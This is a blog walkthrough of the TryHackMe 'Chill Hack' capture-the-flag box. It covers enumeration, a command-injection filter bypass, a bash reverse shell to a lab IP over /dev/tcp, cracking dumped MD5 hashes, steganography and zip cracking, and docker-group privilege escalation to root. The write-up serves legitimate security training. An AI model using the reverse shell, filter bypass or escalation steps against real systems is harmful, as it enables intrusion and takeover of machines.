---
layout: blog.html
title: "TryHackMe - Chill Hack"
date: 2022-05-03
thumbnail: "https://jacen-safe.s3.us-west-004.backblazeb2.com/IUbwjvbt2gv8.png"
---

[Chill Hack](https://tryhackme.com/room/chillhack) is an easy-ranked box. Unfortunately, it wasn't the most fun box to do, with a handful of unrealistic and unintuitive stops along the killchain.
<!-- more -->

## Nmap Enumeration
As ever, the first thing to do is run an nmap scan to see what services are accessible to us on the box. People always have their own methodology for what command line options to use, but here are the ones I went with.

- `-sC`: Run default scripts. Nmap can do additional enumeration beyond just checking for open ports, and this option will run some quick and useful extra scans to give us even more information about what we’re working with.
- `-sV`: Run version detection. Knowing what specific version of a service is in use can help with finding potential vulnerabilities, or ruling them out.
- `-v`: Be verbose. This outputs extra information to the console as the scan runs, the most useful of which are status updates and showing open ports as it finds them.
- `-oA`: Outputs the result of the command into several file formats. Having a persistent record of the scan to go back to later is always useful.

```bash
nmap -sC -sV -vvv -oA nmap/initial 10.10.86.64
```

It's good to do a quick basic nmap scan of the top 1000 ports first to have a starting point and then run a second more comprehensive scan in the background later. In this case, the first scan gives us pretty much all the information we'll need to proceed.

Nmap finds three open ports: port 21 running FTP, port 22 running SSH, and port 80 hosting an HTTP server.

Thanks to running the default scripts, we also know that the FTP server allows anonymous login and that there's a potentially interesting file sitting on it.

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
```

## FTP/HTTP Enumeration
Since the FTP server is such a low-hanging fruit and it'll be very quick to check out, we'll start there. We can confirm that anonymous login does indeed work on the server, and that the file on it is accessible to us.

```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

There's not much else to see there, so we'll move onto the web server. At first glance, the site seems to just be a flat HTML website without much of an attack area, so we'll pass things along to a directory brute force tool (in my case, Feroxbuster) to see if there's anything hidden from us.

Sure enough, Feroxbuster finds a `/secret` directory that seems to have a place for us to input arbitrary shell commands.

![Secret Directory](https://i.snap.as/KXH2FfXQ.png)

## Command Injection
We can deduce from the note on the FTP server that there is some sort of protection in place to keep us from having free rein of the capability. Running `whoami` confirms that we do have the ability to run commands and that we'll be running as the `www-data` user.

![whoami Output](https://i.snap.as/aU53LhIn.png)

Next we'll try running `bash -c` to see if we can get a reverse shell that way. Unsurprisingly, we trigger the filter.

![Command Filter](https://i.snap.as/CCyeTHQR.png)

A common way of bypassing these kinds of filters is escaping characters. Escape characters like `\n` or `\t` can affect how text is formatted, and escaping special characters like `\'` or `\\` lets us use special characters in places where they normally have special meaning. Escaping characters that don't have any special meaning, however, will simply output the character as normal.

![Filter Bypass](https://i.snap.as/7I3782km.png)

Now that we know we can bypass the filter, we can start building out a reverse shell to give us better access to the box.

```bash
b\ash -c "b\ash -i >& /dev/tcp/10.13.14.52/9001 0>&1"
```

## Privilege Escalation
We land as `www-data` in the `/var/www/html` directory. Poking around there, it we find that there's a second web app sitting in `/var/www/files`. In there, we have a PHP file that includes a MySQL configuration.

```php
$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
```

Unfortunately, that password doesn't work as the `root` password, but we can still poke at the MySQL database. There's a `users` table in the `webportal` database, so we can pull a pair of MD5 hashed passwords.

```
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
```

MD5 us a very broken hashing algorithm, so we're able to just run them through CrackStation to get the passwords.

![CrackStation Output](https://i.snap.as/2nbuu9VS.png)

Unfortunately, these passwords don't work on any of the accounts on the box either.

Enumerating the accounts on the box, we have three users outside of `root`: `anurodh`, `apaar`, and `aurick`. Interestingly, we have read access to `apaar`'s home directory. Even more interestingly, there's a shell script called `.helpline.sh` with another command injection vulnerability. And even more interestingly, we can run that script as `apaar`.

```bash
read -p "Enter the person whom you want to talk with: " person
read -p "Hello user! I am $person,  Please enter your message: " msg
$msg 2>/dev/null
```

```
www-data@ubuntu:/$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

If we input `bash` at the `msg` prompt, we land in a bash shell as the `apaar` user. From here we can grab the user flag in the `local.txt` file. We can drop an SSH key in here as well to give us a better, more friendly shell.

## Privesc 2: Electric Boogaloo
Unfortunately, `apaar` doesn't give us a lot of additional permissions, so we'll need to keep poking. Checking `netstat`, there's another service available only to localhost on port 9001 that we can check next.

```
apaar@ubuntu:~$ netstat -lpnut
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 10.10.86.64:68          0.0.0.0:*                           -
```

Since we already have SSH access, we can use SSH port forwarding to look at it on our local machine.

```bash
ssh -i apaar.key -L 9001:127.0.0.1:9001 apaar@10.10.86.64
```

Checking this new port out, it turns out it's running a web server. We're greeted with a login page.

![Login Page](https://i.snap.as/t3prB7mA.png)

From the PHP code we found earlier, we know that this app is vulnerable to SQL injection, and from the database dump we know the usernames and passwords to log in. Either way, we get in.

![After Login](https://i.snap.as/diGCwwjP.png)

Not much to go on here. We have to take a bit of a leap of faith and investigate the image. Turns out it has some steganography in it.

```
$ steghide info hacker-with-laptop_23-2147985341.jpg
"hacker-with-laptop_23-2147985341.jpg":
  format: jpeg
  capacity: 3.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "backup.zip":
    size: 750.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
                                                                                                                     
$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
```

The zip has one file, but it's password protected. That's nothing John The Ripper and rockyou.txt can't take care of. The PHP file includes a Base64 encoded password and a reference to Anurodh, which matches one of the usernames we found earlier.

## I Am Root
With the new password, we're able to SSH into the box as the `anurodh` user. It turns out Anurodh is a member of the `docker` group, which could be a potential escalation vector.

```
anurodh@ubuntu:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

With a little help from [GTFOBins](https://gtfobins.github.io/gtfobins/docker/), we can mount the filesystem into a Docker image, which will give us free rein to view whatever files we want, including the root flag in the `proof.txt` file.